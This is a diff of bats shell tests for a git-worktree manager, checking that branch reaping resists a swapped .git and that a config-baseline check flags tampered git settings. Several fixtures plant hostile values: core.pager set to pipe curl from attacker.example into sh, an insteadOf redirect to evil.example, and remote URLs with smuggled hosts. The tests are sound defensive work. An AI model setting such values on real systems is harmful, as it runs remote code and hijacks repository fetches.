@@ -3335,6 +3335,181 @@ EOF
   [[ "$output" == *"reaped feat/557-d"* ]]
 }
 
+# write_full_anchor_record <wt> <branch> — the 4-line record `dispatch` writes
+# (wt, crew dir, branch, admin dir) for a linked worktree, so crew's
+# _wt_trusted_cwd recognises it.
+write_full_anchor_record() {
+  local path common
+  path="$(anchor_record_path "$1")"
+  common="$(git -C "$TEST_REPO" rev-parse --path-format=absolute --git-common-dir)"
+  mkdir -p "$(dirname "$path")"
+  {
+    realpath -e "$1"
+    realpath -m "$common/crew"
+    printf '%s\n' "$2"
+    realpath -e "$(git -C "$1" rev-parse --absolute-git-dir)"
+  } >"$path"
+}
+
+# make_fake_gitdir <dir> <branch> — a standalone clone of $TEST_REPO with
+# <branch> at its origin tip, whose reference-transaction hook touches
+# $BATS_TEST_TMPDIR/SENTINEL: the repo a worker's swapped `.git` would name.
+make_fake_gitdir() {
+  git clone -q "$TEST_REPO" "$1"
+  git -C "$1" branch "$2" "origin/$2"
+  cat >"$1/.git/hooks/reference-transaction" <<EOF
+#!/bin/sh
+: >"$BATS_TEST_TMPDIR/SENTINEL"
+EOF
+  chmod +x "$1/.git/hooks/reference-transaction"
+}
+
+@test "reap: the merged-branch delete lands in the real repo when the caller's .git is swapped (#633)" {
+  git commit -q --allow-empty -m init
+  git branch feat/633-cand
+  cand_wt="$BATS_TEST_TMPDIR/633-cand-wt"
+  git worktree add -q "$cand_wt" feat/633-cand
+  echo unique >"$cand_wt/work.txt"
+  git -C "$cand_wt" add work.txt
+  git -C "$cand_wt" commit -q -m "cand work"
+  git branch feat/633-here
+  w1="$BATS_TEST_TMPDIR/633-here-wt"
+  git worktree add -q "$w1" feat/633-here
+  w1=$(cd "$w1" && pwd -P)
+  write_full_anchor_record "$w1" feat/633-here
+  scratch="$BATS_TEST_TMPDIR/633-fake"
+  make_fake_gitdir "$scratch" feat/633-cand
+  stub_tmux "" ""
+  # The first headRefOid lookup swaps the caller's .git for the fake, as a
+  # worker could at any point during the sweep; it still prints the real tip
+  # so a discovery-based `git rev-parse` in the fake agrees with it.
+  export SWAP_REPO="$TEST_REPO" SWAP_W1="$w1" SWAP_FAKE="$scratch" SWAP_CAND=feat/633-cand SWAP_MARK="$BATS_TEST_TMPDIR/swapped"
+  cat >"$STUB_DIR/gh" <<'EOF'
+#!/usr/bin/env bash
+printf '%s\n' "$*" >>"$STUB_LOG"
+case "$*" in
+*state*) printf '%s\n' 'MERGED' ;;
+*closingIssuesReferences*) printf '%s\n' '99' ;;
+*headRefOid*)
+  if [ ! -e "$SWAP_MARK" ]; then
+    : >"$SWAP_MARK"
+    rm -f "$SWAP_W1/.git"
+    mv "$SWAP_FAKE/.git" "$SWAP_W1/.git"
+  fi
+  git -C "$SWAP_REPO" rev-parse "refs/heads/$SWAP_CAND"
+  ;;
+esac
+exit 0
+EOF
+  chmod +x "$STUB_DIR/gh"
+  stub_wt_removes
+  CREW_ID=c1 run_crew status "worker:feat/633-cand" done "" "https://example.com/pr/8"
+  cd "$w1"
+  CREW_ID=c1 run run_crew reap --quiet
+  [ "$status" -eq 0 ]
+  [ -e "$BATS_TEST_TMPDIR/swapped" ]
+  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
+  [[ "$output" == *"reaped feat/633-cand"* ]]
+  [ ! -d "$cand_wt" ]
+  run ! git -C "$TEST_REPO" show-ref --verify --quiet refs/heads/feat/633-cand
+}
+
+@test "reap: the branch delete stays anchored when an unrecorded caller's .git is swapped (#633)" {
+  git commit -q --allow-empty -m init
+  git branch feat/633-cand
+  cand_wt="$BATS_TEST_TMPDIR/633-cand-wt"
+  git worktree add -q "$cand_wt" feat/633-cand
+  echo unique >"$cand_wt/work.txt"
+  git -C "$cand_wt" add work.txt
+  git -C "$cand_wt" commit -q -m "cand work"
+  git branch feat/633-here
+  w1="$BATS_TEST_TMPDIR/633-here-wt"
+  git worktree add -q "$w1" feat/633-here
+  w1=$(cd "$w1" && pwd -P)
+  scratch="$BATS_TEST_TMPDIR/633-fake"
+  make_fake_gitdir "$scratch" feat/633-cand
+  stub_tmux "" ""
+  export SWAP_REPO="$TEST_REPO" SWAP_W1="$w1" SWAP_FAKE="$scratch" SWAP_CAND=feat/633-cand SWAP_MARK="$BATS_TEST_TMPDIR/swapped"
+  cat >"$STUB_DIR/gh" <<'EOF'
+#!/usr/bin/env bash
+printf '%s\n' "$*" >>"$STUB_LOG"
+case "$*" in
+*state*) printf '%s\n' 'MERGED' ;;
+*closingIssuesReferences*) printf '%s\n' '99' ;;
+*headRefOid*)
+  if [ ! -e "$SWAP_MARK" ]; then
+    : >"$SWAP_MARK"
+    rm -f "$SWAP_W1/.git"
+    mv "$SWAP_FAKE/.git" "$SWAP_W1/.git"
+  fi
+  git -C "$SWAP_REPO" rev-parse "refs/heads/$SWAP_CAND"
+  ;;
+esac
+exit 0
+EOF
+  chmod +x "$STUB_DIR/gh"
+  stub_wt_removes
+  CREW_ID=c1 run_crew status "worker:feat/633-cand" done "" "https://example.com/pr/8"
+  cd "$w1"
+  CREW_ID=c1 run run_crew reap --quiet
+  [ -e "$BATS_TEST_TMPDIR/swapped" ]
+  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
+  run ! git -C "$TEST_REPO" show-ref --verify --quiet refs/heads/feat/633-cand
+  git --git-dir="$w1/.git" show-ref --verify --quiet refs/heads/feat/633-cand
+}
+
+@test "reap: keeps the recorded worktree the caller stands in after relocating (#633)" {
+  git commit -q --allow-empty -m init
+  git branch feat/633-here
+  w1="$BATS_TEST_TMPDIR/633-here-wt"
+  git worktree add -q "$w1" feat/633-here
+  w1=$(cd "$w1" && pwd -P)
+  write_full_anchor_record "$w1" feat/633-here
+  stub_tmux "" ""
+  cat >"$STUB_DIR/gh" <<'EOF'
+#!/usr/bin/env bash
+printf '%s\n' "$*" >>"$STUB_LOG"
+case "$*" in
+*state*) printf '%s\n' 'MERGED' ;;
+*closingIssuesReferences*) printf '' ;;
+esac
+exit 0
+EOF
+  chmod +x "$STUB_DIR/gh"
+  stub_wt_removes
+  CREW_ID=c1 run_crew status "worker:feat/633-here" done "" "https://example.com/pr/8"
+  cd "$w1"
+  CREW_ID=c1 run run_crew reap
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"it is the current worktree"* ]]
+  [ -d "$w1" ]
+}
+
+@test "reap: refuses from inside a worker worktree whose .git was swapped (#633)" {
+  git commit -q --allow-empty -m init
+  git branch feat/633-cand
+  cand_wt="$BATS_TEST_TMPDIR/633-cand-wt"
+  git worktree add -q "$cand_wt" feat/633-cand
+  git branch feat/633-here
+  w1="$BATS_TEST_TMPDIR/633-here-wt"
+  git worktree add -q "$w1" feat/633-here
+  w1=$(cd "$w1" && pwd -P)
+  write_full_anchor_record "$w1" feat/633-here
+  scratch="$BATS_TEST_TMPDIR/633-fake"
+  make_fake_gitdir "$scratch" feat/633-cand
+  rm -f "$w1/.git"
+  mv "$scratch/.git" "$w1/.git"
+  stub_tmux "" ""
+  stub_wt_removes
+  CREW_ID=c1 run_crew status "worker:feat/633-cand" done "" "https://example.com/pr/8"
+  cd "$w1"
+  CREW_ID=c1 run run_crew reap --quiet
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"inside the worker worktree"* ]]
+  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
+  [ -d "$cand_wt" ]
+}
+
 @test "git-baseline --accept refuses without a tty (#585)" {
   # --accept exists for a human eyeballing a diff of newly-seen exec-capable
   # keys and widening the baseline on purpose; run non-interactively (no tty
@@ -3488,17 +3663,93 @@ crew_tty() {
   [ "$status" -eq 0 ]
 }
 
-@test "git-baseline --accept with no pairs writes an empty baseline (#585)" {
+@test "git-baseline --accept with no pairs writes a marker-only baseline (#585, #678)" {
   git commit -q --allow-empty -m init
   B="$TEST_REPO/.git/crew/git-config-baseline"
   rm "$B"
   crew_tty yes git-baseline --accept
   [ "$status" -eq 0 ]
-  [ -f "$B" ]
-  [ ! -s "$B" ]
+  mapfile -d '' recs <"$B"
+  [ "${#recs[@]}" -eq 1 ]
+  [ "${recs[0]}" = $'#covers\nredirect' ]
   run run_crew git-baseline
   [ "$status" -eq 0 ]
   [[ "$output" == *"no drift"* ]]
+}
+
+@test "git-baseline lists a planted url insteadOf redirect (#678)" {
+  git commit -q --allow-empty -m init
+  seed_git_baseline
+  git config "url.https://evil.example/.insteadOf" "https://github.com/"
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"url.https://evil.example/.insteadof=https://github.com/ (main checkout, "* ]]
+}
+
+@test "git-baseline shows an exec value verbatim: the payload before an @ stays visible (#678)" {
+  git commit -q --allow-empty -m init
+  seed_git_baseline
+  git config core.pager 'curl -s attacker.example|sh;: a@less'
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *attacker.example* ]]
+}
+
+@test "git-baseline shows an exec value verbatim that looks like a URL (#678)" {
+  git commit -q --allow-empty -m init
+  seed_git_baseline
+  git config core.pager 'x://curl attacker.example|sh;:@less'
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *attacker.example* ]]
+}
+
+@test "git-baseline shows a bracketed ssh userinfo host verbatim (#678)" {
+  git commit -q --allow-empty -m init
+  git config remote.origin.url https://github.com/o/r.git
+  seed_git_baseline
+  git config remote.origin.url 'ssh://[evil.example]:22@github.com/o/r.git'
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *evil.example* ]]
+}
+
+@test "git-baseline shows an scp-style remote url raw, so its host stays visible (#678)" {
+  git commit -q --allow-empty -m init
+  git config remote.origin.url https://github.com/o/r.git
+  seed_git_baseline
+  git config remote.origin.url 'attacker.example:x@github.com:o/r.git'
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *remote.origin.url=attacker.example:x@github.com:o/r.git* ]]
+}
+
+@test "git-baseline notes a baseline that predates redirect-key coverage (#678)" {
+  git commit -q --allow-empty -m init
+  : >"$TEST_REPO/.git/crew/git-config-baseline"
+  git config remote.origin.url https://x.example/r.git
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"predates redirect-key coverage"* ]]
+  [[ "$output" == *"next dispatch"* ]]
+  [[ "$output" == *"--accept"* ]]
+  [[ "${output%%remote.origin.url=*}" == *"predates redirect-key coverage"* ]]
+  [[ "$output" == *"remote.origin.url=https://x.example/r.git"* ]]
+}
+
+@test "git-baseline --accept records the redirect marker (#678)" {
+  git commit -q --allow-empty -m init
+  B="$TEST_REPO/.git/crew/git-config-baseline"
+  : >"$B"
+  git config remote.origin.url https://x.example/r.git
+  crew_tty yes git-baseline --accept
+  [ "$status" -eq 0 ]
+  mapfile -d '' recs <"$B"
+  [[ " ${recs[*]} " == *$'#covers\nredirect'* ]]
+  run run_crew git-baseline
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"no drift"* ]]
+  [[ "$output" != *"predates"* ]]
 }
 
 @test "git-baseline --accept repairs a lone-NUL baseline (#585)" {
